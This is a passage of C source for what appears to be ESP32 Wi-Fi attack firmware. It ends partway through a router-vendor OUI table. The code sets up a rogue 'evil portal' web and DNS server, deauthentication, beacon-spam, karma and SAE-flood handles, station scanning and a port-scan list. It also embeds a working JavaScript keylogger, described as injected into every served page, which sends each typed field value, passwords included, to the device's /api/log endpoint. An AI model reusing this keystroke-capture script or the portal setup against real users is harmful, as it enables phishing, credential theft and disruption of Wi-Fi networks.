// wifi_manager.c

#include "managers/wifi_manager.h"
#include "core/callbacks.h"  // For callback function declarations
#include "esp_crt_bundle.h"
#include "esp_event.h"
#include "esp_heap_caps.h" // Add include for heap stats
#include "esp_http_client.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/event_groups.h"
#include "freertos/semphr.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "lwip/ip4_addr.h"
#include "lwip/lwip_napt.h"
#include "managers/ap_manager.h"
#include "managers/rgb_manager.h"
#include "managers/settings_manager.h"
#include "nvs_flash.h"
#include <core/dns_server.h>
#include <ctype.h>
#include <dhcpserver/dhcpserver.h>
#include <esp_http_server.h>
#include <esp_random.h>
#include <fcntl.h>
#include <math.h>
#include <mdns.h>
#include <stdio.h>
#include <string.h>
#include <sys/time.h>
#ifdef WITH_SCREEN
#include "managers/views/music_visualizer.h"
#endif
#include "managers/sd_card_manager.h" // Add SD card manager include
#include "managers/views/terminal_screen.h"
#include "core/glog.h"
#include "core/utils.h" // Add utils include
#include <inttypes.h>
#include "managers/default_portal.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include "mbedtls/ecp.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "mbedtls/sha256.h"
#include "mbedtls/hmac_drbg.h"
#include "mbedtls/bignum.h"
#include "core/serial_manager.h"
#include "managers/settings_manager.h"
#include "managers/status_display_manager.h"

// Defines for Station Scan Channel Hopping
#define SCANSTA_CHANNEL_HOP_INTERVAL_MS 250 // Hop channel every 250ms
#define SCANSTA_MAX_WIFI_CHANNEL 13         // Scan channels 1-13

#define MAX_DEVICES 255
#define CHUNK_SIZE 4096
#define MDNS_NAME_BUF_LEN 65
#define ARP_DELAY_MS 500
#define MAX_PACKETS_PER_SECOND 500

#define BEACON_LIST_MAX 16
#define BEACON_SSID_MAX_LEN 32

// limit how many ap records we keep to avoid memory bloat/crashes
#define MAX_SCANNED_APS 100

#define KARMA_MAX_SSIDS 32

static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
static int g_beacon_list_count = 0;

static void wifi_beacon_list_task(void *param);

// Forward declarations for SAE flood attack
static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static void live_ap_scan_callback(void *buf, wifi_promiscuous_pkt_type_t type);
static esp_err_t start_live_ap_channel_hopping(void);
static void stop_live_ap_channel_hopping(void);
static esp_timer_handle_t live_ap_channel_hop_timer = NULL;
static volatile bool live_ap_hopping_active = false;
static uint32_t last_live_print_ms = 0;
static uint16_t live_last_printed_index = 0;

#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
static const uint8_t live_ap_channels[] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13,
    36,40,44,48,52,56,60,64,
    100,104,108,112,116,120,124,128,132,136,140,144,
    149,153,157,161,165
};
#else
static const uint8_t live_ap_channels[] = {
    1,2,3,4,5,6,7,8,9,10,11,12,13
};
#endif
static const size_t live_ap_channels_len = sizeof(live_ap_channels) / sizeof(live_ap_channels[0]);
static size_t live_ap_channel_index = 0;

uint16_t ap_count;
wifi_ap_record_t *scanned_aps;
const char *TAG = "WiFiManager";

station_ap_pair_t station_ap_list[MAX_STATIONS];
int station_count = 0;
bool manual_disconnect = false;
static bool boot_connection_attempted = false;
void *beacon_task_handle = NULL;
void *deauth_task_handle = NULL;
int beacon_task_running = 0;

static bool karma_portal_active = false;

static volatile bool ap_sta_has_ip = false;


const uint16_t COMMON_PORTS[] = {
    7,     // echo
    20,    // ftp-data
    21,    // ftp
    22,    // ssh
    23,    // telnet
    25,    // smtp
    53,    // dns
    69,    // tftp (udp mostly)
    80,    // http
    88,    // kerberos
    110,   // pop3
    111,   // rpcbind
    119,   // nntp
    123,   // ntp (udp mostly)
    135,   // msrpc
    137,   // netbios-ns
    138,   // netbios-dgm
    139,   // netbios-ssn
    143,   // imap
    161,   // snmp (udp mostly)
    162,   // snmp-trap (udp mostly)
    389,   // ldap
    443,   // https
    445,   // smb
    465,   // smtps
    500,   // ike (udp mostly)
    502,   // modbus
    512,   // exec
    513,   // login
    514,   // syslog/shell (udp mostly)
    515,   // lpd
    587,   // smtp-submission
    593,   // rpc over http
    631,   // ipp
    636,   // ldaps
    646,   // ldp
    873,   // rsync
    902,   // vmware-server
    989,   // ftps-data
    990,   // ftps
    993,   // imaps
    995,   // pop3s
    1080,  // socks
    1099,  // rmi
    1433,  // mssql
    1434,  // mssql-browser (udp mostly)
    1494,  // citrix-ica
    1521,  // oracle-db
    1701,  // l2tp (udp mostly)
    1720,  // h323
    1723,  // pptp
    1883,  // mqtt
    1900,  // ssdp (udp mostly)
    2049,  // nfs
    2082,  // cpanel
    2083,  // cpanel-ssl
    2086,  // whm
    2087,  // whm-ssl
    2095,  // webmail
    2096,  // webmail-ssl
    2222,  // ssh-alt
    2375,  // docker
    2376,  // docker-tls
    2377,  // docker-swarm
    2379,  // etcd
    2380,  // etcd-peer
    2381,  // etcd-alt
    2480,  // oracle-web
    25565, // minecraft
    27017, // mongodb
    27018, // mongodb-shard
    27019, // mongodb-config
    28017, // mongodb-http
    3000,  // dev-http
    3001,  // dev-http-alt
    3128,  // squid-proxy
    32400, // plex
    3260,  // iscsi
    3306,  // mysql
    3389,  // rdp
    3478,  // stun (udp mostly)
    3689,  // daap
    4369,  // epmd
    4444,  // tcp-alt
    4500,  // ipsec-nat-t (udp mostly)
    4789,  // vxlan (udp mostly)
    4848,  // glassfish-admin
    5000,  // http-alt/upnp
    5001,  // http-alt
    5004,  // rtp (udp mostly)
    5005,  // rtp (udp mostly)
    5060,  // sip
    5061,  // sips
    5222,  // xmpp
    5223,  // xmpp-ssl/apns
    5357,  // wsdapi
    5432,  // postgresql
    5555,  // android-adb
    5601,  // kibana
    5671,  // amqp-tls
    5672,  // amqp
    5683,  // coap (udp mostly)
    5900,  // vnc
    5901,  // vnc-1
    5902,  // vnc-2
    5984,  // couchdb
    5985,  // winrm
    5986,  // winrm-https
    6000,  // x11
    6379,  // redis
    6667,  // irc
    7001,  // websphere
    7199,  // cassandra-intra
    8000,  // http-alt
    8008,  // http-alt
    8080,  // http-proxy
    8081,  // http-alt
    8082,  // http-alt
    8083,  // http-alt
    8086,  // influxdb
    8088,  // http-alt
    8123,  // home-assistant
    8161,  // activemq
    8181,  // http-alt
    8200,  // upnp-minidlna
    8222,  // vmware
    8333,  // bitcoin
    8443,  // https-alt
    8500,  // consul
    8530,  // wsus
    8554,  // rtsp-alt
    8883,  // mqtt-tls
    8888,  // http-alt
    9000,  // sonarqube/php-fpm
    9042,  // cassandra-cql
    9080,  // http-alt
    9090,  // http-alt
    9091,  // transmission
    9092,  // kafka
    9100,  // printer
    9200,  // elasticsearch
    9300,  // elasticsearch-node
    9418,  // git
    9443,  // https-alt
    10000, // webmin
    11211, // memcached
    15672, // rabbitmq-mgmt
    51820, // wireguard
    55443  // http-alt
};
const size_t NUM_PORTS = sizeof(COMMON_PORTS) / sizeof(COMMON_PORTS[0]);
static const uint16_t UDP_COMMON_PORTS[] = {
    53, 67, 68, 69, 123, 137, 161, 162, 1900, 500, 514, 520, 5353, 5683
};
static const size_t NUM_UDP_PORTS = sizeof(UDP_COMMON_PORTS) / sizeof(UDP_COMMON_PORTS[0]);
static char PORTALURL[512] = "";
static char domain_str[128] = "";
EventGroupHandle_t wifi_event_group;
wifi_ap_record_t selected_ap;
wifi_ap_record_t *selected_aps = NULL;
int selected_ap_count = 0;
static station_ap_pair_t selected_station;
static bool station_selected = false;
bool redirect_handled = false;
httpd_handle_t evilportal_server = NULL;
dns_server_handle_t dns_handle;
esp_netif_t *wifiAP;
esp_netif_t *wifiSTA;
static uint32_t last_packet_time = 0;
static uint32_t packet_counter = 0;
static uint32_t deauth_packets_sent = 0;
static bool login_done = false;
static char current_creds_filename[128] = "";
static char current_keystrokes_filename[128] = "";
static int ap_connection_count = 0;

#define MAX_HTML_BUFFER_SIZE 2048

// JavaScript snippet injected into every served HTML page to capture keystrokes and input values
// Keep as const array so it lives in flash (.rodata) and not in RAM
static const char CAPTURE_JS_SNIPPET[] =
    "<script>(function(){const send=d=>navigator.sendBeacon?navigator.sendBeacon('/api/log',new Blob([d])):fetch('/api/log',{method:'POST',headers:{\"Content-Type\":\"text/plain\"},body:d});const h=e=>{const t=e.target;if(!(t.name||t.id))return;const tag=t.tagName.toLowerCase();send(Date.now()+\"|\"+tag+\"|\"+(t.name||t.id)+\"|\"+t.value+\"\\n\");};['input','change','keydown'].forEach(ev=>document.addEventListener(ev,h,true));})();</script>";
static char* html_buffer = NULL;
static size_t html_buffer_size = 0;
static bool use_html_buffer = false;
// jit sd mount state for portal (somethingsomething template)
static bool portal_sd_jit_mounted = false;
static bool portal_display_suspended = false;

// single reusable transfer buffer for streaming to reduce heap churn
static char g_stream_buf[CHUNK_SIZE + 1];
static SemaphoreHandle_t g_stream_buf_mutex = NULL;
static inline bool stream_buf_lock(void) {
    if (g_stream_buf_mutex == NULL) {
        g_stream_buf_mutex = xSemaphoreCreateMutex();
        if (g_stream_buf_mutex == NULL) return false;
    }
    return xSemaphoreTake(g_stream_buf_mutex, portMAX_DELAY) == pdTRUE;
}
static inline void stream_buf_unlock(void) {
    if (g_stream_buf_mutex) {
        xSemaphoreGive(g_stream_buf_mutex);
    }
}

// Station Scan Channel Hopping Globals
static esp_timer_handle_t scansta_channel_hop_timer = NULL;
static uint8_t scansta_current_channel = 1;
static bool scansta_hopping_active = false;

// Dynamic list of channels discovered during AP scan (used for station scanning)
static int *scansta_channel_list = NULL;
static size_t scansta_channel_list_len = 0;
static size_t scansta_channel_list_idx = 0;

// Forward declarations for static channel hopping functions
static esp_err_t start_scansta_channel_hopping(void);
static void stop_scansta_channel_hopping(void);

// Station deauthentication task declaration
static void wifi_deauth_station_task(void *param);

// Helper function forward declaration
static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size);

// Globals
static TaskHandle_t deauth_station_task_handle = NULL;

struct service_info {
    const char *query;
    const char *type;
};

// Store in flash: const ensures this large-ish static table is placed in .rodata
static const struct service_info services[] = {{"_http", "Web Server Enabled Device"},
                                              {"_ssh", "SSH Server"},
                                              {"_ipp", "Printer (IPP)"},
                                              {"_googlecast", "Google Cast"},
                                              {"_raop", "AirPlay"},
                                              {"_smb", "SMB File Sharing"},
                                              {"_hap", "HomeKit Accessory"},
                                              {"_spotify-connect", "Spotify Connect Device"},
                                              {"_printer", "Printer (Generic)"},
                                              {"_mqtt", "MQTT Broker"}};

#define NUM_SERVICES (sizeof(services) / sizeof(services[0]))

struct DeviceInfo {
    struct ip4_addr ip;
    struct eth_addr mac;
};

typedef enum {
    COMPANY_DLINK,
    COMPANY_NETGEAR,
    COMPANY_BELKIN,
    COMPANY_TPLINK,
    COMPANY_LINKSYS,
    COMPANY_ASUS,
    COMPANY_ACTIONTEC,
    COMPANY_UNKNOWN
} ECompany;

void wifi_manager_set_manual_disconnect(bool disconnect) {
    manual_disconnect = disconnect;
}

static void tolower_str(const uint8_t *src, char *dst) {
    for (int i = 0; i < 33 && src[i] != '\0'; i++) {
        dst[i] = tolower((char)src[i]);
    }
    dst[32] = '\0'; // Ensure null-termination
}

void configure_hidden_ap() {
    wifi_config_t wifi_config;

    // Get the current AP configuration
    esp_err_t err = esp_wifi_get_config(WIFI_IF_AP, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to get Wi-Fi config: %s\n", esp_err_to_name(err));
        return;
    }

    // Set the SSID to hidden while keeping the other settings unchanged
    wifi_config.ap.ssid_hidden = 1;
    wifi_config.ap.beacon_interval = 10000;
    wifi_config.ap.ssid_len = 0;

    // Apply the updated configuration
    err = esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    if (err != ESP_OK) {
        printf("Failed to set Wi-Fi config: %s\n", esp_err_to_name(err));
    } else {
        printf("Wi-Fi AP SSID hidden.\n");
    }
}

static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                          void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
        case WIFI_EVENT_AP_START:
            printf("WiFi_manager: AP started\n");
            break;
        case WIFI_EVENT_AP_STOP:
            printf("WiFi_manager: AP stopped\n");
            break;
        case WIFI_EVENT_AP_STACONNECTED:
            ap_connection_count++;
            printf("WiFi_manager: Station connected to AP\n");
            esp_wifi_set_ps(WIFI_PS_NONE);
            break;
        case WIFI_EVENT_AP_STADISCONNECTED:
            if (ap_connection_count > 0) ap_connection_count--;
            printf("WiFi_manager: Station disconnected from AP\n");
            login_done = false;
            if (ap_connection_count == 0) {
                esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
                ap_sta_has_ip = false;
            }
            break;
        case WIFI_EVENT_STA_START:
            printf("STA started\n");
            // No auto-connect here - handled by wifi_event_handler
            break;
        case WIFI_EVENT_STA_DISCONNECTED:
            if (manual_disconnect) {
                printf("Disconnected from Wi-Fi (manual)\n");
                manual_disconnect = false; // Reset flag
            } else {
                printf("Disconnected from Wi-Fi\n");
                // No auto-reconnection
            }
            break;
        default:
            break;
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
        case IP_EVENT_STA_GOT_IP:
            break;
        case IP_EVENT_AP_STAIPASSIGNED:
            printf("Assigned IP to STA\n");
            ap_sta_has_ip = true;
            break;
        default:
            break;
        }
    }
}


static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                               void *event_data);
static void wifi_retry_timer_callback(void* arg);

static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id,
                               void *event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        // Only auto-connect on boot if we have saved credentials
        if (!boot_connection_attempted) {
            boot_connection_attempted = true;
            
            const char *saved_ssid = settings_get_sta_ssid(&G_Settings);
            if (saved_ssid && strlen(saved_ssid) > 0) {
                printf("Attempting boot-time connection to saved network: %s\n", saved_ssid);
                TERMINAL_VIEW_ADD_TEXT("Connecting to saved network: %s\n", saved_ssid);
                esp_wifi_connect();
            }
        }
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        wifi_event_sta_disconnected_t* disconnected = (wifi_event_sta_disconnected_t*) event_data;
        
        // Provide more detailed reason descriptions
        const char* reason_str = "Unknown";
        switch(disconnected->reason) {
            case 2: reason_str = "Auth Expired"; break;
            case 3: reason_str = "Auth Leave"; break;
            case 4: reason_str = "Assoc Expire"; break;
            case 5: reason_str = "Assoc Too Many"; break;
            case 6: reason_str = "Not Authed"; break;
            case 7: reason_str = "Not Assoc"; break;
            case 8: reason_str = "Assoc Leave"; break;
            case 15: reason_str = "4Way Handshake Timeout"; break;
            case 201: reason_str = "Beacon Timeout"; break;
            case 202: reason_str = "No AP Found"; break;
            case 203: reason_str = "Auth Fail"; break;
            case 204: reason_str = "Assoc Fail"; break;
            case 205: reason_str = "Handshake Timeout"; break;
        }
        
        // Clean, single-line disconnect logging
        if (manual_disconnect) {
            printf("WiFi disconnected manually\n");
            TERMINAL_VIEW_ADD_TEXT("WiFi disconnected manually\n");
            manual_disconnect = false; // Reset the flag
        } else {
            printf("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
            TERMINAL_VIEW_ADD_TEXT("WiFi disconnected: %s (reason %d)\n", reason_str, disconnected->reason);
        }
        
        xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        printf("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
        TERMINAL_VIEW_ADD_TEXT("Got IP: %s\n", ip4addr_ntoa(&event->ip_info.ip));
        
        xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
    }
}
// Removed old wifi_retry_timer_callback - using unified retry system

static void generate_random_ssid(char *ssid, size_t length) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int random_index = esp_random() % (sizeof(charset) - 1);
        ssid[i] = charset[random_index];
    }
    ssid[length - 1] = '\0'; // Null-terminate the SSID
}

static void generate_random_mac(uint8_t *mac) {
    esp_fill_random(mac, 6); // Fill MAC address with random bytes
    mac[0] &= 0xFE; // Unicast MAC address (least significant bit of the first byte should be 0)
    mac[0] |= 0x02; // Locally administered MAC address (set the second least significant bit)
}

static bool station_exists(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    for (int i = 0; i < station_count; i++) {
        if (memcmp(station_ap_list[i].station_mac, station_mac, 6) == 0 &&
            memcmp(station_ap_list[i].ap_bssid, ap_bssid, 6) == 0) {
            return true;
        }
    }
    return false;
}

static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bssid) {
    if (station_count < MAX_STATIONS) {
        // Copy MAC addresses to the list
        memcpy(station_ap_list[station_count].station_mac, station_mac, 6);
        memcpy(station_ap_list[station_count].ap_bssid, ap_bssid, 6);
        station_count++;

        // Print formatted MAC addresses

    } else {
        printf("Station list full\nCan't add more stations.\n");
        TERMINAL_VIEW_ADD_TEXT("Station list full\nCan't add more stations.\n");
    }
}

typedef struct {
    const char* oui;
    ECompany company;
} oui_company_map_t;

static const oui_company_map_t OUI_MAP[] = {
    {"00055D", COMPANY_DLINK}, {"000D88", COMPANY_DLINK}, {"000F3D", COMPANY_DLINK}, {"001195", COMPANY_DLINK}, {"001346", COMPANY_DLINK}, {"0015E9", COMPANY_DLINK}, {"00179A", COMPANY_DLINK}, {"00195B", COMPANY_DLINK}, {"001B11", COMPANY_DLINK},
    {"001CF0", COMPANY_DLINK}, {"001E58", COMPANY_DLINK}, {"002191", COMPANY_DLINK}, {"0022B0", COMPANY_DLINK}, {"002401", COMPANY_DLINK}, {"00265A", COMPANY_DLINK}, {"00AD24", COMPANY_DLINK}, {"04BAD6", COMPANY_DLINK}, {"085A11", COMPANY_DLINK},
    {"0C0E76", COMPANY_DLINK}, {"0CB6D2", COMPANY_DLINK}, {"1062EB", COMPANY_DLINK}, {"10BEF5", COMPANY_DLINK}, {"14D64D", COMPANY_DLINK}, {"180F76", COMPANY_DLINK}, {"1C5F2B", COMPANY_DLINK}, {"1C7EE5", COMPANY_DLINK}, {"1CAFF7", COMPANY_DLINK},
    {"1CBDB9", COMPANY_DLINK}, {"283B82", COMPANY_DLINK}, {"302303", COMPANY_DLINK}, {"340804", COMPANY_DLINK}, {"340A33", COMPANY_DLINK}, {"3C1E04", COMPANY_DLINK}, {"3C3332", COMPANY_DLINK}, {"4086CB", COMPANY_DLINK}, {"409BCD", COMPANY_DLINK},
    {"54B80A", COMPANY_DLINK}, {"5CD998", COMPANY_DLINK}, {"60634C", COMPANY_DLINK}, {"642943", COMPANY_DLINK}, {"6C198F", COMPANY_DLINK}, {"6C7220", COMPANY_DLINK}, {"744401", COMPANY_DLINK}, {"74DADA", COMPANY_DLINK}, {"78321B", COMPANY_DLINK},
    {"78542E", COMPANY_DLINK}, {"7898E8", COMPANY_DLINK}, {"802689", COMPANY_DLINK}, {"84C9B2", COMPANY_DLINK}, {"8876B9", COMPANY_DLINK}, {"908D78", COMPANY_DLINK}, {"9094E4", COMPANY_DLINK}, {"9CD643", COMPANY_DLINK}, {"A06391", COMPANY_DLINK},
    {"A0AB1B", COMPANY_DLINK}, {"A42A95", COMPANY_DLINK}, {"A8637D", COMPANY_DLINK}, {"ACF1DF", COMPANY_DLINK}, {"B437D8", COMPANY_DLINK}, {"B8A386", COMPANY_DLINK}, {"BC0F9A", COMPANY_DLINK}, {"BC2228", COMPANY_DLINK}, {"BCF685", COMPANY_DLINK},
    {"C0A0BB", COMPANY_DLINK}, {"C4A81D", COMPANY_DLINK}, {"C4E90A", COMPANY_DLINK}, {"C8787D", COMPANY_DLINK}, {"C8BE19", COMPANY_DLINK}, {"C8D3A3", COMPANY_DLINK}, {"CCB255", COMPANY_DLINK}, {"D8FEE3", COMPANY_DLINK}, {"DCEAE7", COMPANY_DLINK},
    {"E01CFC", COMPANY_DLINK}, {"E46F13", COMPANY_DLINK}, {"E8CC18", COMPANY_DLINK}, {"EC2280", COMPANY_DLINK}, {"ECADE0", COMPANY_DLINK}, {"F07D68", COMPANY_DLINK}, {"F0B4D2", COMPANY_DLINK}, {"F48CEB", COMPANY_DLINK}, {"F8E903", COMPANY_DLINK},
    {"FC7516", COMPANY_DLINK},
    {"00095B", COMPANY_NETGEAR}, {"000FB5", COMPANY_NETGEAR}, {"00146C", COMPANY_NETGEAR}, {"001B2F", COMPANY_NETGEAR}, {"001E2A", COMPANY_NETGEAR}, {"001F33", COMPANY_NETGEAR}, {"00223F", COMPANY_NETGEAR}, {"00224B", COMPANY_NETGEAR}, {"0026F2", COMPANY_NETGEAR},
    {"008EF2", COMPANY_NETGEAR}, {"08028E", COMPANY_NETGEAR}, {"0836C9", COMPANY_NETGEAR}, {"08BD43", COMPANY_NETGEAR}, {"100C6B", COMPANY_NETGEAR}, {"100D7F", COMPANY_NETGEAR}, {"10DA43", COMPANY_NETGEAR}, {"1459C0", COMPANY_NETGEAR},  {"204E7F", COMPANY_NETGEAR},
    {"20E52A", COMPANY_NETGEAR}, {"288088", COMPANY_NETGEAR}, {"289401", COMPANY_NETGEAR}, {"28C68E", COMPANY_NETGEAR}, {"2C3033", COMPANY_NETGEAR}, {"2CB05D", COMPANY_NETGEAR}, {"30469A", COMPANY_NETGEAR}, {"3498B5", COMPANY_NETGEAR},  {"3894ED", COMPANY_NETGEAR},
    {"3C3786", COMPANY_NETGEAR}, {"405D82", COMPANY_NETGEAR}, {"44A56E", COMPANY_NETGEAR}, {"4C60DE", COMPANY_NETGEAR}, {"504A6E", COMPANY_NETGEAR}, {"506A03", COMPANY_NETGEAR}, {"54077D", COMPANY_NETGEAR}, {"58EF68", COMPANY_NETGEAR},  {"6038E0", COMPANY_NETGEAR},
    {"6CB0CE", COMPANY_NETGEAR}, {"6CCDD6", COMPANY_NETGEAR}, {"744401", COMPANY_NETGEAR}, {"803773", COMPANY_NETGEAR}, {"841B5E", COMPANY_NETGEAR}, {"8C3BAD", COMPANY_NETGEAR}, {"941865", COMPANY_NETGEAR}, {"9C3DCF", COMPANY_NETGEAR},  {"9CC9EB", COMPANY_NETGEAR},
    {"9CD36D", COMPANY_NETGEAR}, {"A00460", COMPANY_NETGEAR}, {"A021B7", COMPANY_NETGEAR}, {"A040A0", COMPANY_NETGEAR}, {"A42B8C", COMPANY_NETGEAR}, {"B03956", COMPANY_NETGEAR}, {"B07FB9", COMPANY_NETGEAR}, {"B0B98A", COMPANY_NETGEAR},  {"BCA511", COMPANY_NETGEAR},
    {"C03F0E", COMPANY_NETGEAR}, {"C0FFD4", COMPANY_NETGEAR}, {"C40415", COMPANY_NETGEAR}, {"C43DC7", COMPANY_NETGEAR}, {"C89E43", COMPANY_NETGEAR}, {"CC40D0", COMPANY_NETGEAR}, {"DCEF09", COMPANY_NETGEAR}, {"E0469A", COMPANY_NETGEAR},  {"E046EE", COMPANY_NETGEAR},
    {"E091F5", COMPANY_NETGEAR}, {"E4F4C6", COMPANY_NETGEAR}, {"E8FCAF", COMPANY_NETGEAR}, {"F87394", COMPANY_NETGEAR},
    {"001150", COMPANY_BELKIN}, {"00173F", COMPANY_BELKIN}, {"0030BD", COMPANY_BELKIN}, {"08BD43", COMPANY_BELKIN}, {"149182", COMPANY_BELKIN}, {"24F5A2", COMPANY_BELKIN},
    {"302303", COMPANY_BELKIN}, {"80691A", COMPANY_BELKIN}, {"94103E", COMPANY_BELKIN}, {"944452", COMPANY_BELKIN}, {"B4750E", COMPANY_BELKIN}, {"C05627", COMPANY_BELKIN},
    {"C4411E", COMPANY_BELKIN}, {"D8EC5E", COMPANY_BELKIN}, {"E89F80", COMPANY_BELKIN}, {"EC1A59", COMPANY_BELKIN}, {"EC2280", COMPANY_BELKIN},
    {"003192", COMPANY_TPLINK}, {"005F67", COMPANY_TPLINK}, {"1027F5", COMPANY_TPLINK}, {"14EBB6", COMPANY_TPLINK}, {"1C61B4", COMPANY_TPLINK}, {"203626", COMPANY_TPLINK}, {"2887BA", COMPANY_TPLINK},
    {"30DE4B", COMPANY_TPLINK}, {"3460F9", COMPANY_TPLINK}, {"3C52A1", COMPANY_TPLINK}, {"40ED00", COMPANY_TPLINK}, {"482254", COMPANY_TPLINK}, {"5091E3", COMPANY_TPLINK}, {"54AF97", COMPANY_TPLINK},
    {"5C628B", COMPANY_TPLINK}, {"5CA6E6", COMPANY_TPLINK}, {"5CE931", COMPANY_TPLINK}, {"60A4B7", COMPANY_TPLINK}, {"687FF0", COMPANY_TPLINK}, {"6C5AB0", COMPANY_TPLINK}, {"788CB5", COMPANY_TPLINK},
    {"7CC2C6", COMPANY_TPLINK}, {"9C5322", COMPANY_TPLINK}, {"9CA2F4", COMPANY_TPLINK}, {"A842A1", COMPANY_TPLINK}, {"AC15A2", COMPANY_TPLINK}, {"B0A7B9", COMPANY_TPLINK}, {"B4B024", COMPANY_TPLINK},
    {"C006C3", COMPANY_TPLINK}, {"CC68B6", COMPANY_TPLINK}, {"E848B8", COMPANY_TPLINK}, {"F0A731", COMPANY_TPLINK},
    {"00045A", COMPANY_LINKSYS}, {"000625", COMPANY_LINKSYS}, {"000C41", COMPANY_LINKSYS}, {"000E08", COMPANY_LINKSYS}, {"000F66", COMPANY_LINKSYS}, {"001217", COMPANY_LINKSYS}, {"001310", COMPANY_LINKSYS}, {"0014BF", COMPANY_LINKSYS}, {"0016B6", COMPANY_LINKSYS},
    {"001839", COMPANY_LINKSYS}, {"0018F8", COMPANY_LINKSYS}, {"001A70", COMPANY_LINKSYS}, {"001C10", COMPANY_LINKSYS}, {"001D7E", COMPANY_LINKSYS}, {"001EE5", COMPANY_LINKSYS}, {"002129", COMPANY_LINKSYS}, {"00226B", COMPANY_LINKSYS}, {"002369", COMPANY_LINKSYS},
    {"00259C", COMPANY_LINKSYS}, {"002354", COMPANY_LINKSYS}, {"0024B2", COMPANY_LINKSYS}, {"003192", COMPANY_LINKSYS}, {"005F67", COMPANY_LINKSYS}, {"1027F5", COMPANY_LINKSYS}, {"14EBB6", COMPANY_LINKSYS}, {"1C61B4", COMPANY_LINKSYS}, {"203626", COMPANY_LINKSYS},
    {"2887BA", COMPANY_LINKSYS}, {"305A3A", COMPANY_LINKSYS}, {"2CFDA1", COMPANY_LINKSYS}, {"302303", COMPANY_LINKSYS}, {"30469A", COMPANY_LINKSYS}, {"40ED00", COMPANY_LINKSYS}, {"482254", COMPANY_LINKSYS}, {"5091E3", COMPANY_LINKSYS}, {"54AF97", COMPANY_LINKSYS},
    {"5CA2F4", COMPANY_LINKSYS}, {"5CA6E6", COMPANY_LINKSYS}, {"5CE931", COMPANY_LINKSYS}, {"60A4B7", COMPANY_LINKSYS}, {"687FF0", COMPANY_LINKSYS}, {"6C5AB0", COMPANY_LINKSYS}, {"788CB5", COMPANY_LINKSYS}, {"7CC2C6", COMPANY_LINKSYS}, {"9C5322", COMPANY_LINKSYS},
    {"9CA2F4", COMPANY_LINKSYS}, {"A842A1", COMPANY_LINKSYS}, {"AC15A2", COMPANY_LINKSYS}, {"B0A7B9", COMPANY_LINKSYS}, {"B4B024", COMPANY_LINKSYS}, {"C006C3", COMPANY_LINKSYS}, {"CC68B6", COMPANY_LINKSYS}, {"E848B8", COMPANY_LINKSYS}, {"F0A731", COMPANY_LINKSYS},
    {"000C6E", COMPANY_ASUS}, {"000EA6", COMPANY_ASUS}, {"00112F", COMPANY_ASUS}, {"0011D8", COMPANY_ASUS}, {"0013D4", COMPANY_ASUS}, {"0015F2", COMPANY_ASUS}, {"001731", COMPANY_ASUS}, {"0018F3", COMPANY_ASUS}, {"001A92", COMPANY_ASUS},
    {"001BFC", COMPANY_ASUS}, {"001D60", COMPANY_ASUS}, {"001E8C", COMPANY_ASUS}, {"001FC6", COMPANY_ASUS}, {"002215", COMPANY_ASUS}, {"002354", COMPANY_ASUS}, {"00248C", COMPANY_ASUS}, {"002618", COMPANY_ASUS}, {"00E018", COMPANY_ASUS},
    {"04421A", COMPANY_ASUS}, {"049226", COMPANY_ASUS}, {"04D4C4", COMPANY_ASUS}, {"04D9F5", COMPANY_ASUS}, {"08606E", COMPANY_ASUS}, {"086266", COMPANY_ASUS}, {"08BFB8", COMPANY_ASUS}, {"0C9D92", COMPANY_ASUS}, {"107B44", COMPANY_ASUS},
    {"107C61", COMPANY_ASUS}, {"10BF48", COMPANY_ASUS}, {"10C37B", COMPANY_ASUS}, {"14DAE9", COMPANY_ASUS}, {"14DDA9", COMPANY_ASUS}, {"1831BF", COMPANY_ASUS}, {"1C872C", COMPANY_ASUS}, {"1CB72C", COMPANY_ASUS}, {"20CF30", COMPANY_ASUS},
    {"244BFE", COMPANY_ASUS}, {"2C4D54", COMPANY_ASUS}, {"2C56DC", COMPANY_ASUS}, {"2CFDA1", COMPANY_ASUS}, {"305A3A", COMPANY_ASUS}, {"3085A9", COMPANY_ASUS}, {"3497F6", COMPANY_ASUS}, {"382C4A", COMPANY_ASUS}, {"38D547", COMPANY_ASUS},
    {"3C7C3F", COMPANY_ASUS}, {"40167E", COMPANY_ASUS}, {"40B076", COMPANY_ASUS}, {"485B39", COMPANY_ASUS}, {"4CEDFB", COMPANY_ASUS}, {"50465D", COMPANY_ASUS}, {"50EBF6", COMPANY_ASUS}, {"5404A6", COMPANY_ASUS}, {"54A050", COMPANY_ASUS},
